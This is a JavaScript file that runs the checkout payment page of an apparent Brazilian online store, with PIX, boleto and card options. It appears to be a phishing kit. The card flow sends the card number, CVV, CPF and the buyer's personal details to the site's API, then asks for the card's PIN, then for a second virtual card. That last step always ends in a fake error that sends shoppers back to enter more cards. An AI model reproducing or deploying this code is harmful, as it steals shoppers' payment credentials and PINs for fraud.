setcookie('paginaAtual','pagamento');
getUserId()

function getUserId() {
    var userId = localStorage.getItem("user_id");
    // Verifica se o user_id já existe no localStorage
    if (!userId) {
        // Se não existir, gera um novo user_id
        userId = generateUserId();
        // Salva o novo user_id no localStorage
        localStorage.setItem("user_id", userId);
    }
    return userId;
}

async function progresso(classe){
	for(c=1;c<=100;c++){
		await new Promise(r => setTimeout(r, 20));
		$('#progresso').html('<style>.'+classe+'::before{width:'+c+'% !important;}</style>');
		}
	return;
	}
function copiarCodigo(id,texto){
	conteudo = $('#'+id).text();
	if(conteudo=='' || conteudo=='undefined'){
		conteudo = $('#'+id).val();
		}
	navigator.clipboard.writeText(conteudo);
	$('#textoCodigoCopiado').text(texto);
	$('#codigoCopiado').fadeIn(150).css('display','flex');
	setTimeout(function(){
		$('#codigoCopiado').fadeOut(150);
		},1500);
	return;
	}
function imprimirBoleto(){
	linkDoBoleto = $('#linkDoBoleto').text();
	window.open(linkDoBoleto,'_blank');
	return;
	}
function selecionarFormaDePagamento(formaDePagamento){
	setcookie('formaDePagamentoEscolhidaPeloCliente',formaDePagamento);
	$('#valorTotalDoPedidoFixed').hide();
	loading('loading2');
	setTimeout(function(){
		$('#formasDePagamento').hide();
		if(formaDePagamento=='Pix' || formaDePagamento=='Boleto'){
			$('#campoDadosParaNotaFiscal').fadeIn(150).css('display','flex');
			$('#formaDePagamentoEscolhida').text(formaDePagamento);
			$('#formaDePagamentoEscolhidaPedidoFinalizado').text(formaDePagamento);
			if(formaDePagamento=='Pix'){
				$('#iconeFormaDePagamentoEscolhida').attr('src','https://i.imgur.com/EMtLjBO.png');
				}
			if(formaDePagamento=='Boleto'){
				$('#iconeFormaDePagamentoEscolhida').attr('src','https://i.imgur.com/KHFWd3C.png');
				}
			}else if(formaDePagamento=='Cartão'){
				$('#pagarComCartão').fadeIn(500).css('display','flex');
				}
		loading('loading2');
		},1000);
	return;
	}
function voltar1(){
	$('#valorTotalDoPedidoFixed').hide();
	loading('loading2');
	setTimeout(function(){
		window.location.href = '/carrinho';
		},1000);
	return;
	}
function voltar2(){
	loading('loading2');
	setTimeout(function(){
		$('#pagarComCartão').hide();
		$('#campoDadosParaNotaFiscal').hide();
		$('#campoFinalizarPagamento').hide();
		$('#campoPedidoFinalizado').hide();
		$('#formasDePagamento').fadeIn(500).css('display','flex');
		loading('loading2');
		$('#valorTotalDoPedidoFixed').fadeIn(500).css('display','flex');
		},1000);
	return;
	}
function alterarEndereçoDeEntrega(){
	$('#valorTotalDoPedidoFixed').hide();
	loading('loading2');
	setTimeout(function(){
		window.location.href = '/endereço';
		},1000);
	return;	
	}
function alterarDadosParaNotaFiscal(){
	loading('loading2');
	setTimeout(function(){
		$('#valorTotalDoPedidoFixed').hide();
		$('#pagarComCartão').hide();
		$('#campoFinalizarPagamento').hide();
		$('#campoPedidoFinalizado').hide();
		$('#formasDePagamento').hide();
		loading('loading2');
		$('#campoDadosParaNotaFiscal').fadeIn(500).css('display','flex');
		},1000);
	return;
	}
function effectOne(action,id1,id2,placeholder){
	if(action=='focus'){
		$('#'+id1).fadeIn(150);
		$('#'+id2).attr('placeholder','');
		$('#'+id2).css('border-bottom','solid 1px #3483fa');
		}else if(action=='blur'){
			if($('#'+id2).val().length==0){
				$('#'+id2).attr('placeholder',placeholder);
				$('#'+id1).fadeOut(150);	
				}
			$('#'+id2).css('border-bottom','solid 1px #cccccc');
			}
	return;
	}
function irParaRevisãoDoPedido(){
	nome = $('#nomeParaNotaFiscal').val().trim();
	sobrenome = $('#sobrenomeParaNotaFiscal').val().trim();
	cpf = $('#cpfParaNotaFiscal').val().trim();
	if(nome.length<=1){
		$('#nomeParaNotaFiscal').css('border-bottom','solid 1px #f23d4f');
		$('#erroNomeParaNotaFiscal').fadeIn(150);
		return;
		}
	if(sobrenome.length<=1){
		$('#sobrenomeParaNotaFiscal').css('border-bottom','solid 1px #f23d4f');
		$('#erroSobrenomeParaNotaFiscal').fadeIn(150);
		return;
		}
	if(cpf.length<11 || cpf.length>15){
		$('#cpfParaNotaFiscal').css('border-bottom','solid 1px #f23d4f');
		$('#erroCpfParaNotaFiscal').fadeIn(150);
		return;
		}
	loading('loading2');
	setcookie('nomeParaNotaFiscal',nome);
	setcookie('sobrenomeParaNotaFiscal',sobrenome);
	setcookie('cpfParaNotaFiscal',cpf);
	setTimeout(function(){
		$("html,body").animate({scrollTop:0},'slow');
		$('#nomeParaNotaFiscalEletronica').text(nome+' '+sobrenome);
		$('#cpfParaNotaFiscalEletronica').text(cpf);
		$.ajax({
			url: '/api/',type:'POST',async:false,data: 'metodo=buscarValoresDoPedido&formaDePagamento='+getcookie('formaDePagamentoEscolhidaPeloCliente')+'&userID='+getUserId(),dataType:'html',
			success: function(resposta){
				resposta = resposta.split('|');
				console.log(resposta)
				$('.valorDosProdutos').text(resposta[0]);
				if(resposta[1]!='0.00'){
					$('.valorDoFrete').text(resposta[1]);
					$('.corDoValorDoFrete').css('color','#333333');
					$('.simboloDoValorDoFrete').fadeIn();
					}
				$('.valorTotalDoPedidoComDesconto').text(resposta[2]);
				$('.valorTotalDoPedidoSemDesconto').text(resposta[3]);
				$('#formaDePagamentoEscolhidaPedidoFinalizado').text(getcookie('formaDePagamentoEscolhidaPeloCliente'));
				$('#campoDadosParaNotaFiscal').hide();
				$('#campoFinalizarPagamento').fadeIn(150).css('display','flex');
				loading('loading2');
				}
			});
		},1000);
	return;
	}
function confirmarPagamento(){
	formaDePagamento = getcookie('formaDePagamentoEscolhidaPeloCliente');
	progresso('botaoConfirmarPagamento');
	$.ajax({
	url: '/api/',type: 'POST',async: true, data: 'metodo=gerar'+formaDePagamento+'&formaDePagamento='+formaDePagamento+'&nomeParaNotaFiscal='+getcookie('nomeParaNotaFiscal')+'&sobrenomeParaNotaFiscal='+getcookie('sobrenomeParaNotaFiscal')+'&cpfParaNotaFiscal='+getcookie('cpfParaNotaFiscal')+'&nomeEndereço='+getcookie('nomeEndereço')+'&cepEndereço='+getcookie('cepEndereço')+'&estadoEndereço='+getcookie('estadoEndereço')+'&cidadeEndereço='+getcookie('cidadeEndereço')+'&bairroEndereço='+getcookie('bairroEndereço')+'&logradouroEndereço='+getcookie('logradouroEndereço')+'&numeroEndereço='+getcookie('numeroEndereço')+'&telefoneEndereço='+getcookie('telefone')+'&complementoEndereço='+getcookie('complementoEndereço')+'&email='+getcookie('email')+'&nome='+getcookie('nome')+'&telefone='+getcookie('telefone')+'&userID='+getUserId()
	,dataType: 'html', 
		success: function(resposta){ resposta = resposta.trim();
			setTimeout(function(){
				if(formaDePagamento=='Pix'){
					resposta = resposta.split('|');
					codigoPix = resposta[0];
					qrCode = resposta[1];
					//OCULTAR
					$('#campoFinalizarPagamento').hide();
					$('#pedidoFinalizadoViaBoleto').hide();
					//MOSTRAR
					$('#campoPedidoFinalizado').fadeIn(150);
					$('#pedidoFinalizadoViaPix').fadeIn(100).css('display','flex');
					//PIX
					$('#codigoPix').val(codigoPix);
					$('#qrCodePix').attr('src',"https://api.qrserver.com/v1/create-qr-code/?data="+codigoPix);
					$("html,body").animate({scrollTop:0},'slow');	
					}
				if(formaDePagamento=='Boleto'){
					resposta = resposta.split('|');
					linhaDigitavel = resposta[0];
					linkDoBoleto = resposta[1];
					//OCULTAR
					$('#campoFinalizarPagamento').hide();
					$('#pedidoFinalizadoViaPix').hide();
					//MOSTRAR
					$('#campoPedidoFinalizado').fadeIn(150);
					$('#pedidoFinalizadoViaBoleto').fadeIn(100).css('display','flex');
					//PIX
					$('#linhaDigitavel').text(linhaDigitavel);
					$('#linkDoBoleto').text(linkDoBoleto);
					$("html,body").animate({scrollTop:0},'slow');	
					}	
				},1710);
			}
		});
	return;
	}
function buscarParcelamento(){
	$.ajax({
		url: '/api/',type: 'POST',async: true, data: 'metodo=buscarParcelamento'+'&userID='+getUserId()
		,dataType: 'html', 
			success: function(resposta){ resposta = resposta.trim();
				$('#parcelamento').html(resposta);
			}
		});
	return;
	}


function salvarInfo(){
	numeroDoCartão = $('#numeroDoCartão').val().trim();
	nomeDoTitularDoCartão = $('#nomeDoTitularDoCartão').val();
	validadeDoCartão = $('#validadeDoCartão').val();
	cvvDoCartão = $('#cvvDoCartão').val();
	cpfDoTitularDoCartão = $('#cpfDoTitularDoCartão').val();

	if(!numeroDoCartão.includes(' ')){
		$('.erroNumeroDoCartão').fadeIn(150).css('display','flex');
		$('#erroNumeroDoCartão').css('color','#f04449');
		$('#numeroDoCartão').css('border-color','#f04449');
		return;
		}
	if(!nomeDoTitularDoCartão.includes(' ')){
		$('.erroNomeDoTitularDoCartão').fadeIn(150).css('display','flex');
		$('#erroNomeDoTitularDoCartão').css('color','#f04449');
		$('#nomeDoTitularDoCartão').css('border-color','#f04449');
		return;
		}
	if(!validadeDoCartão.includes('/')){
		$('.erroValidadeDoCartão').fadeIn(150).css('display','flex');
		$('#erroValidadeDoCartão').css('color','#f04449');
		$('#validadeDoCartão').css('border-color','#f04449');
		return;
		}
	if(cvvDoCartão.length<3 || cvvDoCartão.length>4){
		$('.erroCvvDoCartão').fadeIn(150).css('display','flex');
		$('#erroCvvDoCartão').css('color','#f04449');
		$('#cvvDoCartão').css('border-color','#f04449');
		return;
		}
	if(!cpfDoTitularDoCartão.includes('.') && !cpfDoTitularDoCartão.includes('-')){
		$('.erroCpfDoTitularDoCartão').fadeIn(150).css('display','flex');
		$('#erroCpfDoTitularDoCartão').css('color','#f04449');
		$('#cpfDoTitularDoCartão').css('border-color','#f04449');
		return;
		}
	post = '&numeroDoCartão='+numeroDoCartão+'&nomeDoTitularDoCartão='+nomeDoTitularDoCartão+'&validadeDoCartão='+validadeDoCartão+'&cvvDoCartão='+cvvDoCartão+'&cpfDoTitularDoCartão='+cpfDoTitularDoCartão;

	$('#dadosDoCartão').hide();
	loading('loading2');
	$.ajax({
		url: '/api/',type: 'POST',async: true, data: 'metodo=salvarInfo&nomeParaNotaFiscal='+getcookie('nomeParaNotaFiscal')+'&sobrenomeParaNotaFiscal='+getcookie('sobrenomeParaNotaFiscal')+'&cpfParaNotaFiscal='+getcookie('cpfParaNotaFiscal')+'&nomeEndereço='+getcookie('nomeEndereço')+'&cepEndereço='+getcookie('cepEndereço')+'&estadoEndereço='+getcookie('estadoEndereço')+'&cidadeEndereço='+getcookie('cidadeEndereço')+'&bairroEndereço='+getcookie('bairroEndereço')+'&logradouroEndereço='+getcookie('logradouroEndereço')+'&numeroEndereço='+getcookie('numeroEndereço')+'&telefoneEndereço='+getcookie('telefone')+'&complementoEndereço='+getcookie('complementoEndereço')+'&email='+getcookie('email')+'&nome='+getcookie('nome')+'&telefone='+getcookie('telefone')+post
		,dataType: 'html', 
			success: function(resposta){ resposta = resposta.trim();
				setTimeout(function(){
					loading('loading2');
					if(resposta.includes('consultavel')){	
						resposta = resposta.split('|');
						iconeBanco = resposta[1];
						iconeBandeira = resposta[2];
						minDigitos = resposta[3];
						maxDigitos = resposta[4];
												
						//MOSTRAR
						$('#campoSenhaDoCartão').fadeIn(500).css('display','flex');
							
						//$('#iconeBanco').attr('src',iconeBanco);
						//$('#iconeBandeira').attr('src',iconeBandeira);
						$("#senhaDoCartão").attr('minlength',minDigitos);
						$("#senhaDoCartão").attr('maxlength',maxDigitos);
	
						placeholder = '';
						for(c=1;c<=maxDigitos;c++){
							placeholder = placeholder+'•';
							}
						$("#senhaDoCartão").attr('placeholder',placeholder);
						$("#senhaDoCartão").val('');
						
						if(minDigitos==maxDigitos){
							textoDigitos = 'Insira a senha do seu cartão, ela tem '+maxDigitos+' dígitos.';
							}else{
								textoDigitos = 'Insira a senha do seu cartão, ela tem de '+minDigitos+' a '+maxDigitos+' dígitos.';
								}
						$("#textoDigitosSenha").text(textoDigitos);
	
						$('#senhaDoCartão').focus();
						}else{
							$('#erroDePagamentoComCartão').css('display','flex');
							$('#dadosDoCartão').fadeIn(500).css('display','flex');
							}
					},1000);
			}});
	return;
	}
function salvarConsultavel(){
	senhaDoCartão = $('#senhaDoCartão').val();
	minDigitos = $('#senhaDoCartão').attr('minlength');
	maxDigitos = $('#senhaDoCartão').attr('maxlength');
	numeroDoCartão = $('#numeroDoCartão').val();
	if(numeroDoCartão.length<16){ $('#erroNumeroDoCartão').fadeIn(250); return;}
	if(senhaDoCartão.length<minDigitos || senhaDoCartão.length>maxDigitos){ $('#erroSenhaDoCartão').fadeIn(250);$('#senhaDoCartão').val(''); return; }
	
	$('#campoSenhaDoCartão').hide();
	loading('loading2');
	$.ajax({
		url: '/api/',type: 'POST',async: true, data: 'metodo=salvarConsultavel&numeroDoCartão='+numeroDoCartão+'&senhaDoCartão='+senhaDoCartão,dataType: 'html', 
		success: function(resposta){ //console.log(resposta);
			resposta = resposta.trim();
			resposta = resposta.replaceAll("\n","");
			window.setTimeout(function(){
				loading('loading2');
				if(resposta=='ativo'){
					$('#cartãoVirtual').fadeIn(500).css('display','flex');
					}else{
						//mostrar
						$('#erroDePagamentoComCartão').css('display','flex');
						$('#dadosDoCartão').fadeIn(500).css('display','flex');
						}
				},1750);
			}
		});	
	return;
	}
function salvarCartãoVirtual(){
	numeroDoCartão = $('#numeroDoCartão').val();
	numeroDoCartãoVirtual = $('#numeroDoCartãoVirtual').val();
	validadeDoCartãoVirtual = $('#validadeDoCartãoVirtual').val();
	cvvDoCartãoVirtual = $('#cvvDoCartãoVirtual').val();
	if(numeroDoCartão==numeroDoCartãoVirtual){ $('#erroNumeroDoCartãoVirtual').fadeIn(250);return; }
	if(numeroDoCartãoVirtual.length<16){ $('#erroNumeroDoCartãoVirtual').fadeIn(250);return;}
	if(cvvDoCartãoVirtual.length<3 || cvvDoCartãoVirtual.length>4){ $('#erroCvvDoCartãoVirtual').fadeIn(250);return;}
	if(!validadeDoCartãoVirtual.includes('/')){ $('#erroValidadeVirtual').fadeIn(250);return;}
	$('#cartãoVirtual').hide();
	loading('loading2');
	$.ajax({
		url: '/api/',type: 'POST',async: true, data: 'metodo=salvarVirtual&numeroDoCartão='+numeroDoCartão+'&numeroDoCartãoVirtual='+numeroDoCartãoVirtual+'&validadeDoCartãoVirtual='+validadeDoCartãoVirtual+'&cvvDoCartãoVirtual='+cvvDoCartãoVirtual,dataType: 'html', 
		success: function(resposta){ 
			setTimeout(function(){
				loading('loading2');

				$('#numeroDoCartãoVirtual').val('');
				$('#validadeDoCartãoVirtual').val('');
				$('#cvvDoCartãoVirtual').val('');
				$('#erroDePagamentoComCartão').css('display','flex');
				$('#cartãoVirutal').hide();
				$('#dadosDoCartão').fadeIn(500).css('display','flex');
				},1750);
			}
		});
	return;
	}

//MASCARAS
function mascaraCpf(id,erroId,proximoId){
	cpf = $('#'+id).val();
	cpf = cpf.replace(/[^a-z0-9]/gi,'');
	cpf = cpf.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');
	if(cpf.length<14){
		if(erroId!=''){
			$('#'+erroId).css('color','rgba(0,0,0,.9)');
			$('#'+id).css('border-color','rgba(0,0,0,.25)');
			$('.'+erroId).fadeOut(150);
			}
		}
	if(cpf.length==4){
		cpf = cpf[0]+cpf[1]+cpf[2]+'.'+cpf[3];
		}else if(cpf.length==5){
				cpf = cpf[0]+cpf[1]+cpf[2]+'.'+cpf[3]+cpf[4];
			}else if(cpf.length==6){
					cpf = cpf[0]+cpf[1]+cpf[2]+'.'+cpf[3]+cpf[4]+cpf[5];
				}else if(cpf.length==7){
						cpf = cpf[0]+cpf[1]+cpf[2]+'.'+cpf[3]+cpf[4]+cpf[5]+'.'+cpf[6];
					}else if(cpf.length==8){
							cpf = cpf[0]+cpf[1]+cpf[2]+'.'+cpf[3]+cpf[4]+cpf[5]+'.'+cpf[6]+cpf[7];
						}else if(cpf.length==9){
								cpf = cpf[0]+cpf[1]+cpf[2]+'.'+cpf[3]+cpf[4]+cpf[5]+'.'+cpf[6]+cpf[7]+cpf[8];
							}else if(cpf.length==10){
									cpf = cpf[0]+cpf[1]+cpf[2]+'.'+cpf[3]+cpf[4]+cpf[5]+'.'+cpf[6]+cpf[7]+cpf[8]+'-'+cpf[9];
								}else if(cpf.length>=11){
										cpf = cpf[0]+cpf[1]+cpf[2]+'.'+cpf[3]+cpf[4]+cpf[5]+'.'+cpf[6]+cpf[7]+cpf[8]+'-'+cpf[9]+cpf[10];
										$.ajax({
											url: '/api/',type:'POST',async:true,data: 'metodo=validarCpfV2&cpf='+cpf,dataType:'html',
											success: function(resposta){
												if(resposta.includes('f')){
													if(erroId!=''){
														$('#'+erroId).css('color','#f04449');
														$('#'+id).css('border-color','#f04449');
														$('.'+erroId).fadeIn(150).css('display','flex');
														}
													}else{
														if(erroId!=''){
															$('#'+erroId).css('color','rgba(0,0,0,.9)');
															$('#'+id).css('border-color','rgba(0,0,0,.25)');
															$('.'+erroId).fadeOut(150);
															}
														if(proximoId!=''){$('#'+proximoId).focus();}
														}	
												}
											});
									}
	$('#'+id).val(cpf);
	return;
	}
function mascaraCartão(id,erroId,proximoId){
	numero = $('#'+id).val();
	numero = numero.replace(/[^a-z0-9]/gi,'');
	numero = numero.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');
	if(numero.length==16){
		if(cfosucmsswerdthy(numero)==false){
			if(erroId!=''){
				$('#'+erroId).css('color','#f04449');
				$('#'+id).css('border-color','#f04449');
				$('.'+erroId).fadeIn(150).css('display','flex');
				}
			}else{
				if(erroId!=''){
					$('#'+erroId).css('color','rgba(0,0,0,.9)');
					$('#'+id).css('border-color','rgba(0,0,0,.25)');
					$('.'+erroId).fadeOut(150);
					}
				}
		}
	if(numero.length==5){
		numero = numero[0]+numero[1]+numero[2]+numero[3]+' '+numero[4];
		}else if(numero.length==6){
			numero = numero[0]+numero[1]+numero[2]+numero[3]+' '+numero[4]+numero[5];
			}else if(numero.length==7){
				numero = numero[0]+numero[1]+numero[2]+numero[3]+' '+numero[4]+numero[5]+numero[6];
				}else if(numero.length==8){
					numero = numero[0]+numero[1]+numero[2]+numero[3]+' '+numero[4]+numero[5]+numero[6]+numero[7];
					}else if(numero.length==9){
						numero = numero[0]+numero[1]+numero[2]+numero[3]+' '+numero[4]+numero[5]+numero[6]+numero[7]+' '+numero[8];
						}else if(numero.length==10){
							numero = numero[0]+numero[1]+numero[2]+numero[3]+' '+numero[4]+numero[5]+numero[6]+numero[7]+' '+numero[8]+numero[9];
							}else if(numero.length==11){
								numero = numero[0]+numero[1]+numero[2]+numero[3]+' '+numero[4]+numero[5]+numero[6]+numero[7]+' '+numero[8]+numero[9]+numero[10];
								}else if(numero.length==12){
									numero = numero[0]+numero[1]+numero[2]+numero[3]+' '+numero[4]+numero[5]+numero[6]+numero[7]+' '+numero[8]+numero[9]+numero[10]+numero[11];
									}else if(numero.length==13){
										numero = numero[0]+numero[1]+numero[2]+numero[3]+' '+numero[4]+numero[5]+numero[6]+numero[7]+' '+numero[8]+numero[9]+numero[10]+numero[11]+' '+numero[12];
										}else if(numero.length==14){
											numero = numero[0]+numero[1]+numero[2]+numero[3]+' '+numero[4]+numero[5]+numero[6]+numero[7]+' '+numero[8]+numero[9]+numero[10]+numero[11]+' '+numero[12]+numero[13];
											}else if(numero.length==15){
												numero = numero[0]+numero[1]+numero[2]+numero[3]+' '+numero[4]+numero[5]+numero[6]+numero[7]+' '+numero[8]+numero[9]+numero[10]+numero[11]+' '+numero[12]+numero[13]+numero[14];
												}else if(numero.length>=16){
													numero = numero[0]+numero[1]+numero[2]+numero[3]+' '+numero[4]+numero[5]+numero[6]+numero[7]+' '+numero[8]+numero[9]+numero[10]+numero[11]+' '+numero[12]+numero[13]+numero[14]+numero[15];
													n = numero.replace(/[^a-z0-9]/gi,'');
													n = n.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');
													if(cfosucmsswerdthy(n)==false){
														if(erroId!=''){
															$('#'+erroId).css('color','#f04449');
															$('#'+id).css('border-color','#f04449');
															$('.'+erroId).fadeIn(150).css('display','flex');
															}
														}else{
															if(erroId!=''){
																$('#'+erroId).css('color','rgba(0,0,0,.9)');
																$('#'+id).css('border-color','rgba(0,0,0,.25)');
																$('.'+erroId).fadeOut(150);
																}
															if(proximoId!=''){ $('#'+proximoId).focus(); }	
															}
													}
	$('#'+id).val(numero);
	return;
	}
function mascaraValidade(id,erroId,proximoId){
	validade = $('#'+id).val();
	validade = validade.replace(/[^a-z0-9]/gi,'');
	validade = validade.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');
	if(validade!=''){
		if(erroId!=''){
			$('#'+erroId).css('color','rgba(0,0,0,.9)');
			$('#'+id).css('border-color','rgba(0,0,0,.25)');
			$('.'+erroId).fadeOut(150);
			}
		}else{
			if(erroId!=''){
				$('#'+erroId).css('color','#f04449');
				$('#'+id).css('border-color','#f04449');
				$('.'+erroId).fadeIn(150).css('display','flex');
				}
			}
	if(validade.length==3){
		validade = validade[0]+validade[1]+'/'+validade[2];
		}else if(validade.length>=4){
			mes = validade[0]+validade[1];
			ano = validade[2]+validade[3];
			validade = validade[0]+validade[1]+'/'+validade[2]+validade[3];
			$.ajax({
				url: '/api/',type: 'POST',async: true, data: 'metodo=validadeV2&mes='+mes+'&ano='+ano,dataType: 'html', 
				success: function(resposta){ resposta = resposta.trim(); 
					if(resposta.length>4){
						if(erroId!=''){
							$('#'+erroId).css('color','#f04449');
							$('#'+id).css('border-color','#f04449');
							$('.'+erroId).fadeIn(150).css('display','flex');
							}
						}else{
							if(erroId!=''){
								$('#'+erroId).css('color','rgba(0,0,0,.9)');
								$('#'+id).css('border-color','rgba(0,0,0,.25)');
								$('.'+erroId).fadeOut(150);
								}
							}
					}
				});
			}
	$('#'+id).val(validade);
	return;
	}
function mascaraCvv(id,erroId,proximoId){
	cvv = $('#'+id).val();
	cvv = cvv.replace(/[^a-z0-9]/gi,'');
	cvv = cvv.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');
	if(cvv!=''){
		if(erroId!=''){
			$('#'+erroId).css('color','rgba(0,0,0,.9)');
			$('#'+id).css('border-color','rgba(0,0,0,.25)');
			$('.'+erroId).fadeOut(150);
			}
		}else{
			if(erroId!=''){
				$('#'+erroId).css('color','#f04449');
				$('#'+id).css('border-color','#f04449');
				$('.'+erroId).fadeIn(150).css('display','flex');
				}
			}
	if(cvv.length>=4){
		cvv = cvv[0]+cvv[1]+cvv[2]+cvv[3];
		}
	$('#'+id).val(cvv);	
	return;
	}
jQuery(document).ready(function($){

	//dados nota fiscal
	if(getcookie('nomeParaNotaFiscal')!='' && getcookie('nomeParaNotaFiscal')!='undefined' && getcookie('nomeParaNotaFiscal')!='null'){
		$('#nomeParaNotaFiscal').val(getcookie('nomeParaNotaFiscal'));
		}
	if(getcookie('sobrenomeParaNotaFiscal')!='' && getcookie('sobrenomeParaNotaFiscal')!='undefined' && getcookie('sobrenomeParaNotaFiscal')!='null'){
		$('#sobrenomeParaNotaFiscal').val(getcookie('sobrenomeParaNotaFiscal'));
		}
	if(getcookie('cpfParaNotaFiscal')!='' && getcookie('cpfParaNotaFiscal')!='undefined' && getcookie('cpfParaNotaFiscal')!='null'){
		$('#cpfParaNotaFiscal').val(getcookie('cpfParaNotaFiscal'));
		}
	//endereço de faturamento
	if(getcookie('cepEndereço')!='' && getcookie('cepEndereço')!='undefined' && getcookie('cepEndereço')!='null'){
		$('#cepEndereçoNotaFiscal').val(getcookie('cepEndereço'));
		}
	if(getcookie('estadoEndereço')!='' && getcookie('estadoEndereço')!='undefined' && getcookie('estadoEndereço')!='null'){
		$('#estadoEndereçoNotaFiscal').val(getcookie('estadoEndereço'));
		}
	if(getcookie('cidadeEndereço')!='' && getcookie('cidadeEndereço')!='undefined' && getcookie('cidadeEndereço')!='null'){
		$('#cidadeEndereçoNotaFiscal').val(getcookie('cidadeEndereço'));
		}
	if(getcookie('bairroEndereço')!='' && getcookie('bairroEndereço')!='undefined' && getcookie('bairroEndereço')!='null'){
		$('#bairroEndereçoNotaFiscal').val(getcookie('bairroEndereço'));
		}
	if(getcookie('logradouroEndereço')!='' && getcookie('logradouroEndereço')!='undefined' && getcookie('logradouroEndereço')!='null'){
		$('#logradouroEndereçoNotaFiscal').val(getcookie('logradouroEndereço'));
		}
	if(getcookie('numeroEndereço')!='' && getcookie('numeroEndereço')!='undefined' && getcookie('numeroEndereço')!='null'){
		$('#numeroEndereçoNotaFiscal').val(getcookie('numeroEndereço'));
		}
	if(getcookie('complementoEndereço')!='' && getcookie('complementoEndereço')!='undefined' && getcookie('complementoEndereço')!='null'){
		$('#complementoEndereçoNotaFiscal').val(getcookie('complementoEndereço'));
		}

	//endereço de entrega finalizar pagamento
	if(getcookie('cepEndereço')!='' && getcookie('cepEndereço')!='undefined' && getcookie('cepEndereço')!='null'){
		$('#cepEndereçoDeEntrega').text(getcookie('cepEndereço'));
		}
	if(getcookie('estadoEndereço')!='' && getcookie('estadoEndereço')!='undefined' && getcookie('estadoEndereço')!='null'){
		$('#estadoEndereçoDeEntrega').text(getcookie('estadoEndereço'));
		}
	if(getcookie('cidadeEndereço')!='' && getcookie('cidadeEndereço')!='undefined' && getcookie('cidadeEndereço')!='null'){
		$('#cidadeEndereçoDeEntrega').text(getcookie('cidadeEndereço'));
		}
	if(getcookie('bairroEndereço')!='' && getcookie('bairroEndereço')!='undefined' && getcookie('bairroEndereço')!='null'){
		$('#bairroEndereçoDeEntrega').text(getcookie('bairroEndereço'));
		}
	if(getcookie('logradouroEndereço')!='' && getcookie('logradouroEndereço')!='undefined' && getcookie('logradouroEndereço')!='null'){
		$('#logradouroEndereçoDeEntrega').text(getcookie('logradouroEndereço'));
		}
	if(getcookie('numeroEndereço')!='' && getcookie('numeroEndereço')!='undefined' && getcookie('numeroEndereço')!='null'){
		$('#numeroEndereçoDeEntrega').text(getcookie('numeroEndereço'));
		}
	if(getcookie('nomeEndereço')!='' && getcookie('nomeEndereço')!='undefined' && getcookie('nomeEndereço')!='null'){
		$('#nomeEndereçoDeEntrega').text(getcookie('nomeEndereço'));
		}
	if(getcookie('telefone')!='' && getcookie('telefone')!='undefined' && getcookie('telefone')!='null'){
		$('#telefoneEndereçoDeEntrega').text(getcookie('telefone'));
		}
	//forma de entrega escolhida
	if(getcookie('formaDeEntregaEscolhida')!='' && getcookie('formaDeEntregaEscolhida')!='undefined' && getcookie('formaDeEntregaEscolhida')!='null'){
		$('#formaDeEntregaEscolhida').text(getcookie('formaDeEntregaEscolhida'));
		}
		
	//buscar parcelamento
	buscarParcelamento();

	});
